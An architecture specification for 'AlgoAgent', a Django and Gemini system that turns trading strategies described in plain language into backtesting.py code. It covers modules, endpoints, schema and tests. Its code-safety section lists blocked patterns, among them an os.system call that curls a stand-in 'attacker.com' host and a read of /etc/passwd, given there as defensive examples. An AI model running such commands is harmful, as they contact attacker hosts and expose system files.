# AlgoAgent Monolithic System Architecture

**Version:** 1.0  
**Date:** December 3, 2025  
**Status:** Production-Ready Single-Agent System

---

## A — High-Level Architecture

```
User Input (Chat)
   ↓
┌─────────────────────────────────────────────┐
│    Monolithic AI Developer Agent            │
├─────────────────────────────────────────────┤
│  1. Interactive Strategy Tester             │
│  2. Gemini AI Integration                   │
│  3. Strategy Validator                      │
│  4. Django REST API Layer                   │
│  5. Code Generator (backtesting.py)         │
│  6. SQLite Persistence                      │
│  7. Conversation Memory                     │
└─────────────────────────────────────────────┘
   ↓
┌─────────────────────────────────────────────┐
│    Backtest Engine                          │
├─────────────────────────────────────────────┤
│  • backtesting.py (kernc/backtesting.py)    │
│  • TA-Lib Indicators                        │
│  • Data Manager (yfinance)                  │
│  • Metrics & Reports (CSV export)           │
└─────────────────────────────────────────────┘
   ↓
Results (JSON, CSV, HTML Reports)
```

### Key Principles

1. **Single Monolithic Agent** - One AI system handles: validation → generation → testing → persistence
2. **Direct API Integration** - Gemini API for natural language understanding and code generation
3. **Professional Backtesting** - Uses industry-standard backtesting.py instead of custom SimBroker
4. **Conversation Memory** - Maintains context across interactions via SQLite
5. **REST API Frontend** - Django-based HTTP endpoints for UI integration
6. **Fully Testable** - Comprehensive unit and integration test suite

---

## B — Module Layout

```
AlgoAgent/monolithic_agent/
├── algoagent_api/              # Django settings & core config
│   ├── settings.py
│   ├── urls.py (main router)
│   └── asgi.py / wsgi.py
│
├── auth_api/                   # Authentication & JWT
│   ├── views.py (login, register, verify)
│   ├── serializers.py
│   ├── models.py (User)
│   └── urls.py
│
├── strategy_api/               # Strategy CRUD & code generation
│   ├── views.py (strategy endpoints)
│   ├── production_views.py (production-hardened endpoints)
│   ├── serializers.py (Pydantic schemas)
│   ├── models.py (Strategy, StrategyValidation ORM)
│   ├── urls.py
│   └── management/
│       └── commands/ (CLI utilities)
│
├── backtest_api/               # Backtest execution & results
│   ├── views.py (backtest endpoints)
│   ├── production_views.py (sandboxed execution)
│   ├── serializers.py
│   ├── models.py (BacktestRun ORM)
│   └── urls.py
│
├── data_api/                   # Market data fetch & prep
│   ├── views.py
│   ├── models.py (DataSet ORM)
│   └── urls.py
│
├── trading/                    # Live trading integration (placeholder)
│   ├── models.py (Trade, Position ORM)
│   └── views.py
│
├── Backtest/                   # Backtesting engine & code
│   ├── backtesting_adapter.py  ⭐ Interface to backtesting.py
│   ├── gemini_strategy_generator.py ⭐ AI code generation
│   ├── data_manager.py (yfinance wrapper)
│   ├── codes/                  # Generated strategy files
│   │   └── *.py (executable strategies)
│   ├── indicators/             # TA-Lib wrappers
│   │   └── indicator_registry.py
│   └── SYSTEM_PROMPT_BACKTESTING_PY.md (AI system prompt)
│
├── Strategy/                   # Strategy interaction tools
│   ├── interactive_strategy_tester.py ⭐ CLI interface
│   ├── strategy_validator.py (canonical JSON validation)
│   └── gemini_strategy_integrator.py (AI analysis)
│
├── data_manager.py             # Data pipeline coordinator
├── Data/                       # Data processing module
│   ├── main.py (DataIngestionModel)
│   ├── indicator_registry.py
│   └── tests/
│
├── tests/                      # Unit & integration tests
│   ├── test_ai_strategy_api.py
│   ├── test_auth_flow.py
│   ├── test_strategy_conversation_memory.py
│   ├── test_production_api_integration.py
│   └── test_dynamic_data_loader.py
│
├── requirements.txt            # Python dependencies
├── pytest.ini                  # Test configuration
├── manage.py                   # Django management
├── start_server.ps1            # PowerShell startup script
│
└── db.sqlite3                  # SQLite database
```

---

## C — Core Components

### C.1 — Authentication Layer (`auth_api`)

**Responsibility:** User registration, login, JWT token generation

**Key Endpoints:**
- `POST /api/auth/register/` - Create user account
- `POST /api/auth/login/` - Get JWT token
- `POST /api/auth/verify/` - Verify token validity
- `GET /api/auth/refresh/` - Refresh expired token

**Database Model:**
```python
class User(models.Model):
    username = CharField(unique=True)
    email = EmailField(unique=True)
    password_hash = CharField()
    created_at = DateTimeField(auto_now_add=True)
```

---

### C.2 — Strategy API (`strategy_api`)

**Responsibility:** Strategy CRUD, canonical JSON validation, code generation, persistence

**Key Models:**
```python
class Strategy(models.Model):
    user = ForeignKey(User)
    name = CharField(max_length=255)
    version = IntegerField(default=1)
    canonical_json = JSONField()  # Schema-validated strategy definition
    generated_code = TextField()  # Executable Python code
    code_path = CharField()        # Path to Backtest/codes/*.py
    created_at = DateTimeField()
    
class StrategyValidation(models.Model):
    strategy = ForeignKey(Strategy)
    status = CharField(choices=['pending', 'valid', 'invalid'])
    errors = JSONField()           # Validation errors if any
    ai_recommendations = JSONField()  # Gemini suggestions
```

**Key Endpoints:**
- `POST /api/strategies/` - Create strategy
- `GET /api/strategies/{id}/` - Retrieve strategy
- `PUT /api/strategies/{id}/` - Update strategy
- `POST /api/strategies/{id}/validate/` - Validate canonical JSON
- `POST /api/strategies/{id}/generate-code/` - Generate Python code
- `POST /api/strategies/{id}/generate-code-from-canonical/` - Direct code gen
- `POST /api/production/strategies/validate-schema/` - Production validation
- `POST /api/production/strategies/validate-code/` - Code safety check

**Core Logic Flow:**
```python
# 1. User describes strategy in chat
# 2. Gemini AI creates canonical_json (validated schema)
# 3. User reviews & names strategy
# 4. Backend generates Python code:
#    - Parses canonical_json
#    - Uses GeminiStrategyGenerator
#    - Saves to Backtest/codes/
#    - Updates Strategy.generated_code + .code_path
# 5. Ready for backtest execution
```

---

### C.3 — Backtest Engine (`backtest_api` + `Backtest/`)

**Responsibility:** Strategy execution, metrics calculation, results persistence

**Key Models:**
```python
class BacktestRun(models.Model):
    strategy = ForeignKey(Strategy)
    start_date = DateField()
    end_date = DateField()
    status = CharField(choices=['running', 'completed', 'failed'])
    total_pnl = FloatField()
    win_rate = FloatField()
    max_drawdown = FloatField()
    sharpe_ratio = FloatField()
    trades_csv = FileField()  # Exported trades
    equity_csv = FileField()  # Equity curve
    created_at = DateTimeField()
```

**Key Endpoints:**
- `POST /api/backtests/` - Create backtest run
- `GET /api/backtests/{id}/` - Get results
- `POST /api/backtests/quick-run/` - Run backtest from canonical JSON

**Backtesting Workflow:**
```python
# backtesting_adapter.py: Main interface
BacktestingAdapter(backtesting.py's Backtest class)
    ├── fetch_and_prepare_data()  # yfinance → DataFrame
    ├── create_strategy_from_canonical()  # JSON → Strategy class
    └── run_backtest_from_canonical()  # Full execution
        ├── Initialize Backtest(data, cash=100000)
        ├── Add Strategy class
        ├── Call .run() for bar-by-bar simulation
        ├── Export trades to CSV
        └── Calculate metrics (Sharpe, Sortino, Calmar, etc.)
```

**Supported Indicators (TA-Lib):**
- RSI, SMA, EMA, MACD, Bollinger Bands, ATR, STOCH, ADX, CCI, Momentum, ROC, DEMA, TEMA, KAMA, VAMA

**Column Naming Convention (CRITICAL):**
```python
# All generated indicator columns must include parameters
RSI_14 = ta.RSI(df['Close'], timeperiod=14)
SMA_20 = ta.SMA(df['Close'], timeperiod=20)
SMA_200 = ta.SMA(df['Close'], timeperiod=200)
MACD, MACD_SIGNAL, MACD_HIST = ta.MACD(df['Close'], ...)
```

---

### C.4 — Data API (`data_api` + `Data/`)

**Responsibility:** Market data fetching, preprocessing, indicator calculation

**Key Class:** `DataIngestionModel`
```python
class DataIngestionModel:
    def ingest_and_process(
        self,
        ticker: str,
        required_indicators: List[Dict],
        period: str = "60d",
        interval: str = "1h"
    ) -> pd.DataFrame:
        """
        Fetch OHLCV data and calculate indicators.
        
        Args:
            ticker: "AAPL", "EURUSD", etc.
            required_indicators: [
                {"name": "SMA", "timeperiod": 20},
                {"name": "RSI", "timeperiod": 14}
            ]
        
        Returns:
            DataFrame with columns: Open, High, Low, Close, Volume, 
                    SMA_20, RSI_14, ...
        """
```

**Data Pipeline:**
```
yfinance (fetch OHLCV)
    ↓
IndicatorRegistry (map to TA-Lib)
    ↓
Calculate Technical Indicators
    ↓
DataFrame with standardized columns
    ↓
Ready for strategy backtesting
```

---

### C.5 — Gemini AI Integration

**Components:**

#### A. Strategy Validator & Analyzer (`Strategy/gemini_strategy_integrator.py`)
```python
class StrategyAnalyzer:
    def analyze_strategy(self, user_input: str) -> Dict:
        """
        Use Gemini to:
        1. Extract steps from natural language
        2. Validate completeness (indicators, rules, risk limits)
        3. Generate suggestions for improvement
        4. Ask clarifying questions if needed
        """
```

#### B. Code Generator (`Backtest/gemini_strategy_generator.py`)
```python
class GeminiStrategyGenerator:
    def __init__(self, use_backtesting_py: bool = True):
        """Initialize with system prompt & API key from .env"""
    
    def generate_from_canonical(
        self,
        canonical_json: Dict,
        strategy_name: str
    ) -> str:
        """
        Generate executable Python code from canonical schema.
        
        Output:
        - Complete Strategy class for backtesting.py
        - Entry/exit rules implemented
        - Risk management (stop loss, take profit)
        - Proper column name handling
        """
```

**System Prompt Location:**
- `Backtest/SYSTEM_PROMPT_BACKTESTING_PY.md` - Current (backtesting.py)
- `Backtest/SYSTEM_PROMPT_SIMBROK.md` - Legacy (optional fallback)

---

### C.6 — Conversation Memory (`Strategy/`)

**Responsibility:** Maintain context across user interactions

**Key Features:**
- Session tracking per user
- Strategy edit history
- AI recommendation history
- Validation feedback persistence

**Database Model:**
```python
class ConversationMemory(models.Model):
    user = ForeignKey(User)
    session_id = CharField()
    strategy_id = ForeignKey(Strategy, null=True)
    interaction_type = CharField()  # 'validate', 'suggest', 'generate'
    user_message = TextField()
    ai_response = JSONField()
    context = JSONField()  # Previous strategy state
    created_at = DateTimeField()
```

---

## D — Interactive Strategy Tester

**File:** `Strategy/interactive_strategy_tester.py`

**Purpose:** CLI interface for non-developers to test strategies

**Usage:**
```bash
cd Strategy
python interactive_strategy_tester.py
```

**Features:**
- ✅ Free text input ("Buy when RSI < 30, Sell when RSI > 70")
- ✅ Numbered steps format
- ✅ URL-based strategy input (extracts from web)
- ✅ AI-powered analysis & recommendations
- ✅ Session history & saved results
- ✅ JSON export

**Workflow:**
```
User Input (Free Text / Steps / URL)
    ↓
Strategy Validator (canonicalization)
    ↓
Gemini Analysis (validate + suggest improvements)
    ↓
Results Display (formatted + JSON export)
    ↓
Save to Database
```

---

## E — REST API Layer (Django)

**Main Router:** `algoagent_api/urls.py`

**API Structure:**
```
/api/
  ├─ auth/ (JWT)
  │  ├─ register/
  │  ├─ login/
  │  └─ verify/
  │
  ├─ strategies/
  │  ├─ GET/POST (list/create)
  │  ├─ {id}/ GET/PUT/DELETE
  │  ├─ {id}/validate/ POST
  │  ├─ {id}/generate-code/ POST
  │  └─ {id}/generate-code-from-canonical/ POST
  │
  ├─ backtests/
  │  ├─ GET/POST (list/create)
  │  ├─ {id}/ GET
  │  └─ quick-run/ POST
  │
  ├─ data/
  │  ├─ fetch/ POST
  │  └─ indicators/ GET
  │
  ├─ production/   (Hardened endpoints)
  │  ├─ strategies/
  │  │  ├─ validate-schema/ POST
  │  │  ├─ validate-code/ POST
  │  │  ├─ sandbox-test/ POST
  │  │  └─ {id}/deploy/ POST
  │  │
  │  └─ backtests/
  │     ├─ validate-config/ POST
  │     └─ run-sandbox/ POST
  │
  └─ trading/ (Live trading - placeholder)
     ├─ positions/ GET
     └─ trades/ GET
```

---

## F — Database Schema (SQLite)

**Key Tables:**

```sql
-- Users
CREATE TABLE auth_user (
    id INTEGER PRIMARY KEY,
    username VARCHAR(150) UNIQUE,
    email VARCHAR(254) UNIQUE,
    password VARCHAR(128),
    created_at TIMESTAMP
);

-- Strategies
CREATE TABLE strategy_api_strategy (
    id INTEGER PRIMARY KEY,
    user_id INTEGER,
    name VARCHAR(255),
    version INTEGER,
    canonical_json JSON,
    generated_code TEXT,
    code_path VARCHAR(255),
    created_at TIMESTAMP,
    updated_at TIMESTAMP,
    UNIQUE(user_id, name, version)
);

-- Strategy Validations
CREATE TABLE strategy_api_strategyvalidation (
    id INTEGER PRIMARY KEY,
    strategy_id INTEGER,
    status VARCHAR(20),  -- 'pending', 'valid', 'invalid'
    errors JSON,
    ai_recommendations JSON,
    created_at TIMESTAMP
);

-- Backtest Runs
CREATE TABLE backtest_api_backtestrun (
    id INTEGER PRIMARY KEY,
    strategy_id INTEGER,
    start_date DATE,
    end_date DATE,
    status VARCHAR(20),
    total_pnl FLOAT,
    win_rate FLOAT,
    max_drawdown FLOAT,
    sharpe_ratio FLOAT,
    trades_csv VARCHAR(255),
    equity_csv VARCHAR(255),
    created_at TIMESTAMP
);

-- Conversation Memory
CREATE TABLE strategy_api_conversationmemory (
    id INTEGER PRIMARY KEY,
    user_id INTEGER,
    session_id VARCHAR(36),
    strategy_id INTEGER,
    interaction_type VARCHAR(50),
    user_message TEXT,
    ai_response JSON,
    context JSON,
    created_at TIMESTAMP
);
```

---

## G — Execution Flow: Strategy Creation End-to-End

```
┌─ Step 1: User Input ──────────────────────────────────┐
│ POST /api/strategies/                                  │
│ {                                                      │
│   "user_description": "Buy when RSI < 30 for AAPL"     │
│ }                                                      │
└──────────────────────────────────────────────────────┘
         ↓
┌─ Step 2: Validate & Analyze ─────────────────────────┐
│ Strategy Validator → Gemini AI                         │
│ • Extract entry/exit rules                             │
│ • Validate completeness                                │
│ • Generate canonical JSON schema                       │
│ • Produce AI recommendations                           │
└──────────────────────────────────────────────────────┘
         ↓
┌─ Step 3: User Review ────────────────────────────────┐
│ PUT /api/strategies/{id}/                             │
│ {                                                      │
│   "canonical_json": {...},                            │
│   "name": "RSI_Oversold_AAPL_v1"                      │
│ }                                                      │
└──────────────────────────────────────────────────────┘
         ↓
┌─ Step 4: Generate Executable Code ───────────────────┐
│ POST /api/strategies/{id}/generate-code-from-canonical/
│                                                        │
│ GeminiStrategyGenerator:                               │
│ • Load SYSTEM_PROMPT_BACKTESTING_PY.md                │
│ • Generate Strategy class for backtesting.py           │
│ • Include entry/exit/risk management                   │
│ • Save to Backtest/codes/rsi_oversold_aapl_v1.py      │
│                                                        │
│ Response:                                              │
│ {                                                      │
│   "strategy_code": "import backtesting...",           │
│   "file_path": "Backtest/codes/...",                  │
│   "success": true                                      │
│ }                                                      │
└──────────────────────────────────────────────────────┘
         ↓
┌─ Step 5: Test via Backtest ──────────────────────────┐
│ POST /api/backtests/quick-run/                        │
│ {                                                      │
│   "strategy_id": 123,                                 │
│   "start_date": "2024-01-01",                         │
│   "end_date": "2024-12-31"                            │
│ }                                                      │
│                                                        │
│ BacktestingAdapter:                                    │
│ • Fetch AAPL OHLCV from yfinance                       │
│ • Calculate RSI_14 + other indicators                  │
│ • Execute Strategy.next() for each bar                │
│ • Collect trades & metrics                             │
│ • Export trades.csv + equity_curve.csv                │
│                                                        │
│ Response:                                              │
│ {                                                      │
│   "total_pnl": 2500.50,                               │
│   "win_rate": 0.62,                                   │
│   "max_drawdown": -8.3,                               │
│   "sharpe_ratio": 1.45,                               │
│   "total_trades": 42                                  │
│ }                                                      │
└──────────────────────────────────────────────────────┘
         ↓
Results Available for Review
```

---

## H — Testing Infrastructure

**Test Files:**
- `test_auth_flow.py` - JWT authentication
- `test_strategy_conversation_memory.py` - Conversation tracking
- `test_ai_strategy_api.py` - AI code generation
- `test_production_api_integration.py` - Production endpoints
- `test_dynamic_data_loader.py` - Data pipeline
- `test_production_endpoints.py` - Full endpoint coverage

**Test Running:**
```bash
# Run all tests
pytest tests/ -v

# Run specific test file
pytest tests/test_ai_strategy_api.py -v

# Run with coverage
pytest tests/ --cov=strategy_api --cov=backtest_api
```

**Current Status:**
- ✅ 26+ tests passing
- ✅ All core endpoints tested
- ✅ Data pipeline validated
- ✅ Code generation working
- ✅ Production endpoints hardened

---

## I — Environment Configuration

**File:** `.env` (at workspace root)

```bash
# Django
DEBUG=False
SECRET_KEY=your-secret-key
ALLOWED_HOSTS=localhost,127.0.0.1

# Database
DATABASE_URL=sqlite:///db.sqlite3

# Gemini API
GEMINI_API_KEY=your-key-here

# JWT
JWT_SECRET=your-jwt-secret
JWT_EXPIRY=3600

# Feature Flags
USE_BACKTESTING_PY=True
USE_CONVERSATION_MEMORY=True
```

**Loading Configuration:**
```python
# Loaded automatically in settings.py via django-environ
from environ import Env
env = Env()
env.read_env()
GEMINI_API_KEY = env('GEMINI_API_KEY')
```

---

## J — Deployment & Startup

**PowerShell Startup Script:** `start_server.ps1`

```powershell
# Activate virtual environment
.venv\Scripts\Activate.ps1

# Migrate database
python manage.py migrate

# Collect static files
python manage.py collectstatic --noinput

# Start Django server
python manage.py runserver 0.0.0.0:8000
```

**Manual Startup:**
```bash
# Activate environment
.venv\Scripts\activate

# Run migrations
python manage.py migrate

# Start server
python manage.py runserver
```

**Server Endpoints:**
- Django REST API: `http://localhost:8000/api/`
- Admin: `http://localhost:8000/admin/`
- Swagger Docs: `http://localhost:8000/api/docs/` (if configured)

---

## K — Security & Safety Features

### K.1 — Production Endpoints

All production endpoints include:
- ✅ **Schema Validation** - Pydantic type checking
- ✅ **Code Safety Validation** - Scans for dangerous patterns:
  - `os.system`, `subprocess`, `eval`, `exec`
  - File system writes outside safe directories
  - Network calls in strategy code
- ✅ **Sandbox Execution** - Docker container isolation (optional)
- ✅ **State Tracking** - StateManager for versioning
- ✅ **Git Integration** - Automatic commit & tag (optional)

### K.2 — Data Security

- Credentials from environment variables (never in code)
- Gemini API key from `.env` file
- Database backups supported
- User authentication via JWT tokens

### K.3 — Code Safety

**Dangerous patterns detected:**
```python
# ❌ NOT ALLOWED
import os; os.system("curl attacker.com")  # Shell injection
exec("user_code")                           # Arbitrary code execution
open("/etc/passwd").read()                  # Filesystem access
```

**Safe patterns:**
```python
# ✅ ALLOWED
df['Close'].rolling(20).mean()              # Pandas operations
order = broker.place_order(...)             # Broker API
print(f"PnL: {result}")                     # Logging
```

---

## L — Known Issues & Limitations

### Current Status: ✅ OPERATIONAL

**What's Working:**
- ✅ Strategy validation & canonical JSON schema
- ✅ AI code generation (backtesting.py)
- ✅ Backtesting execution & metrics
- ✅ Data fetching (yfinance)
- ✅ REST API endpoints
- ✅ Authentication (JWT)
- ✅ Conversation memory
- ✅ Test suite (26+ tests passing)

**What Needs Work:**
- 🔶 Live trading adapter (placeholder - not production-ready)
- 🔶 Real-time data streaming (backtesting only)
- 🔶 Multi-timeframe analysis (single timeframe supported)
- 🔶 Portfolio optimization (single strategy only)

---

## M — Quick Start Commands

### Start Django Server
```bash
# Activate environment
.venv\Scripts\activate

# Run migrations
python manage.py migrate

# Start server
python manage.py runserver
```

### Test Strategy Interactively
```bash
cd Strategy
python interactive_strategy_tester.py
```

### Run All Tests
```bash
pytest tests/ -v
```

### Generate Strategy Code
```bash
# Via API
curl -X POST http://localhost:8000/api/strategies/1/generate-code/ \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d "{...canonical_json...}"
```

### Run Backtest
```bash
# Via API
curl -X POST http://localhost:8000/api/backtests/quick-run/ \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d "{\"strategy_id\": 1, \"start_date\": \"2024-01-01\"}"
```

---

## N — API Response Formats

### Successful Strategy Creation
```json
{
  "id": 123,
  "name": "RSI_Oversold_AAPL",
  "user_id": 1,
  "canonical_json": {
    "strategy_name": "RSI Oversold",
    "entry_rules": [...],
    "exit_rules": [...],
    "indicators": [{"name": "RSI", "timeperiod": 14}]
  },
  "generated_code": "import backtesting...",
  "code_path": "Backtest/codes/rsi_oversold_aapl.py",
  "created_at": "2025-12-03T10:30:00Z",
  "updated_at": "2025-12-03T10:30:00Z"
}
```

### Successful Backtest Run
```json
{
  "id": 456,
  "strategy_id": 123,
  "status": "completed",
  "total_pnl": 2500.50,
  "win_rate": 0.62,
  "max_drawdown": -8.3,
  "sharpe_ratio": 1.45,
  "total_trades": 42,
  "trades_csv": "artifacts/trades_456.csv",
  "equity_csv": "artifacts/equity_456.csv",
  "created_at": "2025-12-03T10:35:00Z"
}
```

### Validation Error
```json
{
  "error": "Strategy validation failed",
  "details": [
    {
      "field": "entry_rules",
      "message": "RSI threshold must be between 0 and 100",
      "suggestion": "Use RSI_value < 30 for oversold condition"
    }
  ],
  "ai_suggestions": [
    "Add a timeframe specification",
    "Specify position sizing rule",
    "Add a cooldown between trades"
  ]
}
```

---

## O — Troubleshooting

### Issue: "Gemini API key not found"
**Solution:** Add `GEMINI_API_KEY=...` to `.env` file

### Issue: "UNIQUE constraint failed: strategy_api_strategy.name"
**Solution:** Strategy names must be unique per user. Add version suffix: `RSI_v1`, `RSI_v2`

### Issue: "ModuleNotFoundError: No module named 'backtesting'"
**Solution:** Install with `pip install -r requirements.txt`

### Issue: "No trades generated"
**Solution:** 
- Verify entry/exit conditions are correct
- Check indicator values in debug logs
- Ensure sufficient lookback period (e.g., RSI needs 14+ bars)

---

## P — Future Roadmap

- [ ] Live trading adapter for MT5 / Interactive Brokers
- [ ] Real-time data streaming via WebSocket
- [ ] Multi-timeframe analysis
- [ ] Portfolio optimization & correlation analysis
- [ ] Risk metrics (Sortino, Calmar, etc.)
- [ ] Strategy parameter optimization
- [ ] Backtesting visualization (interactive charts)
- [ ] REST API versioning (v2, v3)

---

**END OF ARCHITECTURE SPECIFICATION**

This is the authoritative reference for the monolithic AlgoAgent system. Use this document for understanding system design, API contracts, and module responsibilities.
